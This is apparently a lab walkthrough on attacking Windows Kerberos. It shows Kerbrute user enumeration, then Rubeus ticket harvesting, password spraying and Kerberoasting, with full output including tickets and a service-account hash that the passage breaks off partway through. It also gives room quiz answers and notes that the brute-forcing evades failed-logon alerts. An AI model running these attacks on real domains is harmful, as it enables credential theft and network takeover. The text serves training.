Task 1  Introduction
---------------------

#### This room will cover all of the basics of attacking Kerberos the windows ticket-granting service;

**We'll cover the following**:

1. ***Initial enumeration*** using tools like <ins>Kerbrute</ins> and <ins>Rubeus</ins>
2. ***Kerberoasting***
3. ***AS-REP Roasting*** with <ins>Rubeus</ins> and <ins>Impacket</ins>
4. ***Golden/Silver Ticket Attacks***
5. ***Pass the Ticket***
6. ***Skeleton key attacks using mimikatz***

#### NOTE:
_This room will be related to very real-world applications_ and will most likely <ins>not</ins> help with `any CTFs` however it will give you _great starting knowledge of how to escalate your privileges to a domain admin by attacking Kerberos_ and _allow_ you to _take over and control a network_.


#### What is Kerberos?

***Kerberos*** is the default authentication service for Microsoft Windows domains. It is intended to be more "secure" than NTLM by using third party ticket authorization as well as stronger encryption. Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like NTLM that we can use to our advantage.

#### Common Terminology:

- **Ticket Granting Ticket (TGT)** - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.

- **Key Distribution Center (KDC)** - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.

- **Authentication Service (AS)** - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.

- **Ticket Granting Service (TGS)** - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.

- **Service Principal Name (SPN)** - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.

- ***KDC Long Term Secret Key (KDC LT Key)*** - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.

- ***Client Long Term Secret Key (Client LT Key)*** - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.

- ***Service Long Term Secret Key (Service LT Key)*** - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.

- ***Session Key*** - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.

- ***Privilege Attribute Certificate (PAC)*** - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.


#### AS-REQ w/ Pre-Authentication In Detail

1. The AS-REQ step in Kerberos authentication starts when a user requests a TGT from the KDC. In order to validate the user and create a TGT for the user, the KDC must follow these exact steps:
	- The first step is for the user to encrypt a timestamp NT hash and send it to the AS.
	- The KDC attempts to decrypt the timestamp using the NT hash from the user, if successful the KDC will issue a TGT as well as a session key for the user.

#### Ticket Granting Ticket Contents

In order to understand how the service tickets get created and validated, we need to start with where the tickets come from. The TGT is provided by the user to the KDC, in return, the KDC validates the TGT and returns a service ticket.

![](TGT.png?raw=true)

#### Service Ticket Contents

To understand how Kerberos authentication works you first need to understand what these tickets contain and how they're validated.

A service ticket contains two portions:

1. The <ins>service provided portion</ins>
2. The <ins>user-provided portion</ins>

	- ***Service Portion***: User Details, Session Key, Encrypts the ticket with the service account NTLM hash.
	- ***User Portion***: Validity Timestamp, Session Key, Encrypts with the TGT session key.


![](Service_ticket.png?raw=true)


#### Kerberos Authentication Overview

![](kerberos_auth.png?raw=true)


AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).

AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.

TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service, the client wants to access.

TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.

AP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access.

AP-REP - 6.) The service grants access.


#### Kerberos Ticket<ins>s</ins> Overview

**NOTE**:
There is a reason why I underlined "`s`" as all these tickets altogether are called <ins>Kerberos Tickets</ins>.

The main ticket that you will see is a ticket-granting ticket these can come in various forms:
- _.kirbi_ for **Rubeus** 
- _.ccache_ for **Impacket**

The main ticket that you will see is a .kirbi ticket. A ticket is typically base64 encoded and can be used for various attacks. The ticket-granting ticket is only used with the KDC in order to get service tickets. Once you give the TGT the server then gets the User details, session key, and then encrypts the ticket with the service account NTLM hash. Your TGT then gives the encrypted timestamp, session key, and the encrypted TGT. The KDC will then authenticate the TGT and give back a service ticket for the requested service. A normal TGT will only work with that given service account that is connected to it however a KRBTGT allows you to get any service ticket that you want allowing you to access anything on the domain that you want.

#### Attack Privilege Requirements:

- Kerbrute Enumeration - No domain access required 
- Pass the Ticket - Access as a user to the domain required
- Kerberoasting - Access as any user required
- AS-REP Roasting - Access as any user required
- Golden Ticket - Full domain compromise (domain admin) required 
- Silver Ticket - Service hash required 
- Skeleton Key - Full domain compromise (domain admin) required



1. What does TGT stand for?

:arrow_right: `Ticket Granting Ticket`

2. What does SPN stand for?

:arrow_right: `Service Principal Name`

3. What does PAC stand for?

:arrow_right: `Privilege Attribute Certificate`

4. What two services make up the KDC?

:arrow_right: `AS, TGS`


#### Task 2  Enumeration w/ Kerbrute

Kerbrute is a popular enumeration tool used to brute-force and enumerate valid active-directory users by abusing the Kerberos pre-authentication.

Previously it has been covered in: 02.Attactive Directory Room


You need to add the DNS domain name along with the machine IP to /etc/hosts inside of your attacker machine or these attacks will not work for you - `10.10.242.205  CONTROLLER.local`

##### Abusing Pre-Authentication Overview

#### IMP:
By brute-forcing Kerberos pre-authentication, _you do not trigger the account failed to log on event which can throw up red flags to blue teams_.

 When brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.

```
$ kerbrute_linux_amd64 userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/23/21 - Ronnie Flathers @ropnop

2021/07/23 22:30:39 >  Using KDC(s):
2021/07/23 22:30:39 >   CONTROLLER.local:88

2021/07/23 22:30:40 >  [+] VALID USERNAME:       admin1@CONTROLLER.local
2021/07/23 22:30:40 >  [+] VALID USERNAME:       admin2@CONTROLLER.local
2021/07/23 22:30:40 >  [+] VALID USERNAME:       administrator@CONTROLLER.local
2021/07/23 22:30:41 >  [+] VALID USERNAME:       machine1@CONTROLLER.local
2021/07/23 22:30:41 >  [+] VALID USERNAME:       httpservice@CONTROLLER.local
2021/07/23 22:30:41 >  [+] VALID USERNAME:       machine2@CONTROLLER.local
2021/07/23 22:30:41 >  [+] VALID USERNAME:       sqlservice@CONTROLLER.local
2021/07/23 22:30:41 >  [+] VALID USERNAME:       user1@CONTROLLER.local
2021/07/23 22:30:41 >  [+] VALID USERNAME:       user2@CONTROLLER.local
2021/07/23 22:30:41 >  [+] VALID USERNAME:       user3@CONTROLLER.local
2021/07/23 22:30:41 >  Done! Tested 100 usernames (10 valid) in 1.741 seconds
```

1. How many total users do we enumerate?

`10`

2. What is the SQL service account name?

`sqlservice`

3. What is the second "machine" account name?

`machine2`

3. What is the third "user" account name?

`user3`



#### Task 3  Harvesting & Brute-Forcing Tickets w/ Rubeus


Rubeus is a powerful tool for attacking Kerberos. Rubeus is an adaptation of the kekeo tool and developed by HarmJ0y the very well known active directory guru.

Rubeus has a wide variety of attacks and features that allow it to be a very versatile tool for attacking Kerberos.

Just some of the many tools and attacks include:

- overpass the hash
- ticket requests and renewals
- ticket management
- ticket extraction
- harvesting
- pass the ticket
- AS-REP Roasting
- Kerberoasting


The tool has way too many attacks and features for me to cover all of them so I'll be covering only the ones I think are most crucial to understand how to attack Kerberos however I encourage you to research and learn more about Rubeus and its whole host of attacks and features here
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)


***Harvesting Tickets w/ Rubeus***

```
Rubeus.exe harvest /interval:30
```

This command tells Rubeus to harvest for TGTs every 30 seconds

```
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads> Rubeus.exe harvest /interval:30

   ______        _                       
  (_____ \      | |                      
   _____) )_   _| |__  _____ _   _  ___  
  |  __  /| | | |  _ \| ___ | | | |/___) 
  | |  \ \| |_| | |_) ) ____| |_| |___ | 
  |_|   |_|____/|____/|_____)____/(___/  
                                         
  v1.5.0                                 

[*] Action: TGT Harvesting (with auto-renewal) 
[*] Monitoring every 30 seconds for new TGTs          
[*] Displaying the working TGT cache every 30 seconds 


[*] Refreshing TGT ticket cache (7/23/2021 4:39:10 PM) 

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL 
  StartTime             :  7/23/2021 4:35:49 PM                                                          
  EndTime               :  7/24/2021 2:35:49 AM                                                          
  RenewTill             :  7/30/2021 4:35:49 PM                                                          
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable               
  Base64EncodedTicket   :                                                                                
                                                                                                         
    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr 
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEErDni1cFaRhypXUzdsTewKB0XH8H+34+lToT
    W8PzPRXZECRY/bOopA/l8E3XyvdSnjHDXZ10zK8+iJtWB2vGyjW3lVW5E3MzjfHLDNLldV9ucnv8nQPHLUYeRPG8iuOerGTq0qXm
    Nj8CwFuYWgIx/e4udg3Gziot39aLH6jUsScNLzy2TrE74ftQATTpScB0FhVzHhb9QV5u4irHYXCO5w4x4l9+x0RaDiakJhMBK4JI
    6vsZeJqUgeTBkbzIFmRGmxA9S7Iy7HlQNVp3bsErlVkVRce4OFhlxw8nKo8x/LnDjVvfmydBzsqyU2Pj+YqKC0C3JoEfn54R2KXn
    IruNpdLwDWOzQFYVkazCjAccDoeD94MtrxoesMNXsjdz4fJ9wKx7V92no5oXMC9P1tB8E98pXrjDEhq05jKhng5TcLxm1kaYo13+
    of3FzB3a8F42/MfZHWd3i0sgA1AbWhIktXO+jshV0PUkOQm3L9niOCzgkPUUSJtJd54z2qKg8rI6pdruyiI5Md0PpEV0yTNc+Lfy
    wEvuBZJ2hOqNGWO+s2Xfz1yHh8jb3CIjd7iE6N/8qVE4CuA6GfEWeqiVw4oLSdNRKZH558WGyVNlrYus7o4m6BHDGVcs3ZcMto8r
    jWVgySNJnVi3BLEvBebXbKYHk7fKPiVQEjpzQU10xacoGaYoY+miQ4McchIArFsVQAxLIQ27hy+dTsM0OhLh4Mw+T9ezMmAA5Yz5
    tCC9HZ4OYyXJ7rP65eilUDqXD0UN0uJm27cSaWnoxp0es5teAKc3DWCsDYvQ9I1JMPwJfKCeSlvh5GwGaS5oOWEYTEYnCh9RcrAS
    Ys4qxO3VyuWW+4h/FUFL2ncymcPsPtTPRBIab8YmIPIvPy8qpFqKzZdV04uv7UV3TVmknHo6q1POqWJ7IYjz1Y++o+SpzMcAb2SY
    gXZKKuvx9qUFEZ0PnPzRE8NMLaBbMPy3NlCZW+7tNVpdTricocjfXQ458WpSyb4BAm/G3UdZWChjrBthPPduag1xVV4L3CwOfUZB
    8BzuuAMiItAnMDma26Rjs6D8J9f+2RP6nfUO3GZWLtUhO+nWBdfD9dSumn6eXHr22rbFXLJSgbBW0w1U9hbIclFpGBBF9thaa8CR
    LTZzYSnzZr1YJgddECDUkQzqc8fzizPjdrP938/A6i095v5mHG8/ZtH4NuglsIuF0rYdaDewcL+RHTjeH2oDYRbFGuGYJhvYI2Kq
    4NRXMQlOj0hpu6ivZDitBAZwgh2H6W3wMJUE4c/zdrIGjSvFkgQdcCcPXa/1XfNdmTI1TvHjbdy1MkW3s66JALMC1B2/hEUbP3Fh
    mnUFPqaVoA4eE8lZb5d4Usn9aIt3lEUDGwDSVSPPzvqfpRnfVx3JzV+jgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr
    MCmgAwIBEqEiBCCyG61Siilp5KB5qldzV6i8kFYXkOMY5wvjnIx25fQU1qESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw 
    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDIxMDcyMzIzMzU0OVqmERgPMjAyMTA3MjQwOTM1NDlapxEYDzIwMjEwNzMw
    MjMzNTQ5WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL
  StartTime             :  7/23/2021 4:35:49 PM
  EndTime               :  7/24/2021 2:35:49 AM
  RenewTill             :  7/30/2021 4:35:49 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEkCmBdQRys4ChlEXStxay+mccFCwBRbREXuG
    yzlMxTYF/zKe3MiZcpFYaCO6YAqpBc8Q4/8gMloc6+u2/CpDPsFfX6QxS/sCT8c51rBh7p5/JycRnrZX7MOdlrx77aVFw0x7x7h3
    TBpPvFFeaTC7uD/Xr6sg/0DhOdPOCrnq1mkYymqQvzMmv2RoE1KbP7SSJu2Qllwko5g/X13VzJyW5CoByQOUZlmJfGQEuCKp7Xor
    Mqa4bjQEG8//1bbPEyc6/ru1TQc+0KCBhsGPno9oYqRpG7TKmcGZyjSJikVfohTYqnEfwgiMpUC5Aad3T0DC5ZX33oalrKdssFVV
    DO4PunSl/rsDRm1C177XqtHcOjcaibWxP2zBCb/WpHi5oF2X5e4mvY9YaTVl3v8gkI8YCBQDJ6ubxum/znKIlZEsnG4M5PLy7KDR
    i19kdtW/c3EQ+kl1xtCZapoElSH2fHrJDnjAFH5ZDCk8+BSFLDAFsqzA9sCE7oELu4hf/R/GJOhiqNqWkT34LH1X5g9efOBw4djy
    GegRwxljZyPXmKjhmS73XAWq1F/+wVmWG2oFnHKrznt9aGOtaD27VBc8eqMug+j7puoBqRAeeDMHjmgyV9pnuOb0aCYlXv5ljPli
    NlEEDKK7VJSrd7pFm1SQCBH/F2Rb+itGUcDWi+SYiZG8Y4hY/LcnDCOssNZ0c3P1RCIgEwf7zTxia+mFrYJOg5oLZybuTRuIbsun
    hLatAy2368knayCKuw144O0P/mxzeVY3jdlP+37sCGPwKBg3V975NeBucaq4hrV0+U/5lFz/k+fg5qBRa9D//5JZr53pUDv0ZXDJ
    RRFiLqHVCY64eP660jHts3idyVY4Mm/8Ercgohjkipnq/yMyz8fFGV5V6HkB9XUNj5okhohZA80sheSGCQW6pwgKSErrVGkE2FN5
    p+TH7Fr9WyPyS4M8bxqNtWMN1e5Eir7empeBdJhKPtE9yry1ao5a2RxcfpSDOYTxI8rUqF31dw/ZiAMAaDcWzfHfF35ostRIPYyQ
    prd+9mj5lGMYySn0eYF2SUn2EnphP/tDFxowBccCPX87TNCI2HJmDowl2k85Rw+7noW1pStSykTHEV2vJjCtCsIWnYlQhDFe3dwx
    D4X0QixvKueMrItTOUxs7wpE6sVV1Dj/IXnJMMAi4VfrAk1m05J56qPIHkPl3kzOEv9i2jYnsrXEjH4p2mS++d3pZQc7q+BJwGPU
    Xq1No/F2kfc+nzHjewO3rb6EXJ0Ab6d82yKVoARmzbtBDcORmx1kQp8tfyFqNP75ltbMJCEpbVvRP2OJyHtlWLVk6zof76C3+uBv
    Wjv/VGWvglcTdyEmUuzww0WOvfmAG5Y1+v87LK3chznqoKt1Y5uhU5SjgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr
    MCmgAwIBEqEiBCAj58UzilGyDO7SCjyh7YzZCsRjcp1Mj2chMpshGI3+haESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw
    DxsNQ09OVFJPTExFUi0xJKMHAwUAYKEAAKURGA8yMDIxMDcyMzIzMzU0OVqmERgPMjAyMTA3MjQwOTM1NDlapxEYDzIwMjEwNzMw
    MjMzNTQ5WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM

  User                  :  Administrator@CONTROLLER.LOCAL
  StartTime             :  7/23/2021 4:36:47 PM
  EndTime               :  7/24/2021 2:36:47 AM
  RenewTill             :  7/30/2021 4:36:47 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQwMIIELKADAgESoQMCAQKiggQeBIIEGvzdxCrPIIi7/mvSaZ+WteYTb+QnRSG7HOlP
    7CgLsH7BuuAKy3iwZyclTdxe3dOBpRrITrlIbnqlnO7FHHw0lmj6FMuErycESdQOJHNeZ6YxxPKxCDYCIWfZ3TN388Vnca1l+wvW
    XXRW4j0vbdes9quNMaRz59QjA5XQIT9OQ+LJCegWpr07mP6Dmn7+MU4mdpcxTg5A64VGnl2jxXRxyoKDNf+DtbQB03eKH/AKGSMt
    g4r9PSSPwio+WvRZ66D1WducK7nCPhqUQf7BHQRtBZKw008rvEdauekhmNyW1s24WAtfhZzb2v3IaQU5P/7Rvku6HeGDAku3CV8/
    SvuwMCMIPeeNg7ZwDaPFiUQm6uNMTZcyMiE0Gc/lgwXCLQLO3oh/kfgV4XYnTQR3gkoRJxh+GxWHDhkqFI5xHN9/VsXIHw1ShjhB
    sueGanI4bwWFifzN8ASV+k42mCYwZ9XMSCy4du7HqeXVME1zxhHN7Fe3RCNvYh6xIFuZlhUY/LRyhYWeMg/jonMmncIk2OiD8Zhr
    89wBOXFIPIjWyc0kLKaiUs4QLHnKm6jVosbOcVfaVVqSyuW84ehXc5fWrS6n8NyrMwzBTlp2irwLttu1MmkknbTrXjkhTCKCUXe8
    ZR1QbX1xwKeCs5ymC9jF0LgWsXgnSOCUFeFZKx63D/RIP+VmP4/JpEu99NIrITMAUbMFs4caMQhNY5y4Iea4PPpXxFFR8kofKyMy
    kPN8pc1OQDl3n3ZbqjRdbaWYpGezG2LHYEBwsvUHSA1N5zNxZIil3P1wGyJkTZ6sXZOv04ZtOAzdQxoZWYVWdZ8MCV5osttm/zBo
    T2nSxCUybWZcfcenrqnu6gNnY0DHB39zX63lba7OD/P5u1LQ7FXditGXMbbENsQlm4Mn+sfm4w8tryx51HHiIMcxabYWFcMLiMBE
    IIqF4TgOPknm3i3DyUt+JDZ1B8BCPmQCUj+GBpooTsH5ta/BntoXN5CpSYjsZylBVfQ0qrk8b4tqlTWSe4QjEn4dX7cVQeWzo31i
    JRt01F5FXQYlF98DbYYxM9yv8CkyRIEvn7NfYiWnUhtsLC1yCLNbcD2uUN2yPIFIWFk21jxPh5o4Xtnl/vAhQl8dfLqnc020tOxe
    iN1hTThYwucr4Al/NNKYs/ceDSYH/JYKNKj2SpTnSbojHB92NE7MX5sJGuZn4fVaYW0pfpM9EsFP1Z0Kp8CwN39bEm2ww9v5+vSH
    Om5ABgjmHhpu52hDCJBJIpvmXQ049Vm/ib0wDs60HRGI/XZCyBp9WO8ENVmerrY/c5A+853UcvUsipHkeXxMWnvLnAwErgMZtMjG
    UNCC1gk/rjk6ZkQATvNZ3fVrz3r+9nFqS2D/clcKxwalfdtMPbf87vpQkHyW7JNsc6OB9zCB9KADAgEAooHsBIHpfYHmMIHjoIHg
    MIHdMIHaoCswKaADAgESoSIEIH5xyRLeXfHO+WQPnbtnqPOOurNtYOo48akhtAfcNhUKoRIbEENPTlRST0xMRVIuTE9DQUyiGjAY
    oAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4QAApREYDzIwMjEwNzIzMjMzNjQ3WqYRGA8yMDIxMDcyNDA5MzY0N1qnERgP
    MjAyMTA3MzAyMzM2NDdaqBIbEENPTlRST0xMRVIuTE9DQUypJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIuTE9DQUw=

[*] Ticket cache size: 3
[*] Sleeping until 7/23/2021 4:39:40 PM (30 seconds) for next display

```


***Brute-Forcing / Password-Spraying w/ Rubeus***

1. Rubeus can do both 
	- brute force passwords

		- When brute-forcing passwords you use a single user account and a wordlist of passwords to see which password works for that given user account. 
	
	- as well as password spray user accounts.

		- In password spraying, you give a single password such as Password1 and "spray" against all found user accounts in the domain to find which one may have that password.


This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket.

This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.

Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command: 
```
echo 10.10.242.205 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
```
```
Rubeus.exe brute /password:Password1 /noticket
```
This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user.

```
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads> Rubeus.exe brute /password:Password1 /noticket

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0 

[-] Blocked/Disabled user => Guest 
[-] Blocked/Disabled user => krbtgt  
[+] STUPENDOUS => Machine1:Password1 
[*] base64(Machine1.kirbi):

      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi
      JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQKiggPx
      BIID7QGThiZIyFKG/46euIJo0j1wR+SvF98X8/Qio4xYRSPrbe48KsRKDkFRMwI90iJc3mYgz0/lWlud
      fJMSFiWuCCzjADTY1jIQHNzjCo8ikhrjcTzMpEML1iyXxRGzfTetFZz2OyqTQaIj4ld6PALB80AWxxGl
      WaaI+xqzx0SjHQeNwW45YEm43nvD9W+6LFNYfarPe0dXRapPwZiICzE5V3YOowbsXMwN7Pr1bHBC6hEH
      W/3UtaFa8HqxKuwfzOdetkNPK5eZBeK6luz5ZYg0+XuyRPvaViBcqtPM8lUuhFB/Aopv63XIObwjUoeA
      RL10YlG5J76JDW/rDDHVQBuYsEGf3gb4qciR+jUZSm2O8zIaUTxiL48jhPdNiG2g6NDoD9bl834QAYHg
      x7oDcOcWWuTgeWC9YHo9MioRTQKph+rdMxbZZIHCiOixGOMqAZNWHuUY2JGLYsyLLBlK8M/xhLR3yV7F
      ItQ7rzNh2uCtE917Oz69sPtK4xRrYz+sdxYFyU2cR6D1DtXsIeOp0tI4sNj1vjfOfSltYkzyzagLJLDk
      z2sev/JV3kJjCZxSmB15OaLUuxnpcHVUDeezfmRZuH5YBlNnGiXSPXIk7tL+VUaw4CV+zo8Sn5O1aKx8
      TQhNZz6VZijAkHfJKXhQzblR+i2wore41/OSTg1ny1Og3xtDvZ3runQ06IFOx4BvUsW4oAHdJFZKUvC+
      mJx6fc9DgFu4GzEbm/8IDuLYm0DOHdV9gRZLn8eeZqp2C+r2+fTdgoLFa+uha4xf8fawzCu8otl1pGqM
      9lvFpwnWUDDK1I0AEzOnAwKjiOPBOU3/2TSaA3Ss6S6LLiJ8XOV/+5smDaX1CYdUAzdIgl0Dj/ROPcRP
      0TdlGN2wiTKrYB/JQDQTrCtbf36fgnYJ4/pZY+niObDqpo3B9Oon8zhKxYQUsm/KjbNehloa/jWCLch2
      Wyt+UnsZJSLJH58d/uYEL6tdRXE2yl9BEaG3ukvK8cRZHMAvWP5v5qGSb6SuhOeA1HYWrzSA7Mn38lsU
      E817lfV847fWjKxNR/7cVO6Ib3AOpMVenvdLwpJUvf+tipyWwTvR42OiTllcflYzQ9MgKb1iUuZ7ZsPg
      iDR7ix/a0FkqwdRESLVOlyvBiNGvl4aZ8mp78NwObnQcgAU4K/fKY0DvXZQeypvNpUqpkVVBPLGhvMK1
      oQM1caoZqQ4kfN5YiUZcQADaAZ2Clzoq1h8lmaf7GaemMUCxPn6IrFv9sTW3hGpbRZKaU1kWFqphOB2V
      TRcZa8FO+TcqipVfIyPMozch+OykmJ9ZKHLiBp5M3j7WWXEso8b8r3EfAP+IYVD7kKOB8jCB76ADAgEA
      ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIDMmu1KxA1LhZqwqZLFoF+2A4SvoQmxeut/5
      7TBt5HTZoRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAAKUR
      GA8yMDIxMDcyMzIzNDMxNlqmERgPMjAyMTA3MjQwOTQzMTZapxEYDzIwMjEwNzMwMjM0MzE2WqgSGxBD
      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs



[+] Done

```

#### NOTE:
Be mindful of how you use this attack as it may lock you out of the network depending on the account lockout policies.


1. Which domain admin do we get a ticket for when harvesting tickets?

`Administrator`

2. Which domain controller do we get a ticket for when harvesting tickets?

`CONTROLLER-1$`


#### Task 4  Kerberoasting w/ Rubeus & Impacket

In this task we'll be covering one of the most popular Kerberos attacks - Kerberoasting.
Kerberoasting allows a user to request a <ins>_service ticket_</ins> for any service with _a registered SPN_ then use that ticket to crack the service password.
If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account.
To enumerate Kerberoastable accounts I would suggest a tool like **BloodHound** to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain. That is a bit out of scope for this room but it is a great tool for finding accounts to target.

In order to perform the attack, we'll be using both Rubeus as well as Impacket so you understand the various tools out there for Kerberoasting. There are other tools out there such a ***kekeo*** and ***Invoke-Kerberoast*** but I'll leave you to do your own research on those tools.


#### 1. With Rubeus

```
> Rubeus.exe kerberoast
```
```
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe kerberoast                         

   ______        _                       
  (_____ \      | |                      
   _____) )_   _| |__  _____ _   _  ___  
  |  __  /| | | |  _ \| ___ | | | |/___) 
  | |  \ \| |_| | |_) ) ____| |_| |___ | 
  |_|   |_|____/|____/|_____)____/(___/  
                                         
  v1.5.0                                 
                                         
                                         
[*] Action: Kerberoasting                

[*] NOTICE: AES hashes will be returned for AES-enabled accounts. 
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts. 
                                                                             
[*] Searching the current domain for Kerberoastable users                    

[*] Total kerberoastable users : 2 


[*] SamAccountName         : SQLService                                     
[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local  
[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111 
[*] PwdLastSet             : 5/25/2020 10:28:26 PM                          
[*] Supported ETypes       : RC4_HMAC_DEFAULT                               
[*] Hash                   : $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.loca 
                             l:30111*$68BB05246B27737F30DD6C7C6CF09AEC$439E421932F8B35988593081AF4C42CB01993D 
                             3E13D025EADAA0A2FFA355DD8B8B93A347B17942163A2509609FC8CCE061F1B7C1B52EA711602013 
                             06CC4F2B72B1A8CB772C117CB9F858B83096A29466BC2C464D4AE86FC8B082C343B9814C5BDFD67E
                             69D2EF93F3189D2D2E4CAB88BA67D286B338FD9BE27AF1F59482CFDCCA0AC450AB08AF48D9D121B3
                             33369C068CDE359143474241489268429FE749ACE34B081AD0C3E2C028F35E0727C96EC6934A9712
                             CAB18D4D2EC665B2F25549FF0F0E8598D0E883B56F96F9121621FF4DEF73E58E82432ADDFD23BE4F
                             561643FFFB9019A0BDB143C96C97F35CD386DF1D814E4FE810B08473CAA87FE01C31EB39D5B3191F
                             3C92CC3F090EFCB445AFE7658B58A7984E1430E64BA1F70576EF75475E62F3C8AFADBB06A42565E6
                             CECD47E30F8624092D4906734A44DCDC457B71B7037528EFE1A22809E91E4E6566004F7F0E0EFF54
                             872A4FCC994002C95635C379CE0ACE45232343F49F092916DC2606D78B4B671D2854369825623FE3
                             6D2F68182633A14CC8A64161C733845A8293D38149950C7F0BBB539CA2796362169C8D3B57D26243
                             5BBF3A4BB435CB7D4196F0637597214955D4483052FE440CBC9DF023EAE556D63A9811032A5EE316
                             F55E826688BAD5FC5F6D1A9CD2617A169ED319CA8BF4BF6EDE3B3A46036D22DE454ED3EABE2EF23A
                             56CD5D40FFB8E17241A2190CD2B00FAF18EE25D8948C5C5457BDD6934F754BE2767D5703D8D78F61
                             90C8FB91068041228A8EF15DA3C9A7566D53E0D5FA8B2D35EA4C5BC8C089EE6D30F3862F2D6FCB12
                             89B431A2C82E6AB3DC8D3520E008E9922DB8741C87169CC353BDEA3C857D543E065809EAA7DD35C1
                             5191EA02B8888B9B9BE7216C6DACAC8543F08F006587CE93ECA730A7F30BF08B610772C5BD02B423
                             D638A98D6D407A1E4D7DFD348ED6425EEA34C69C77897F08261BAE181E654B13FD61A0A81459C9B2
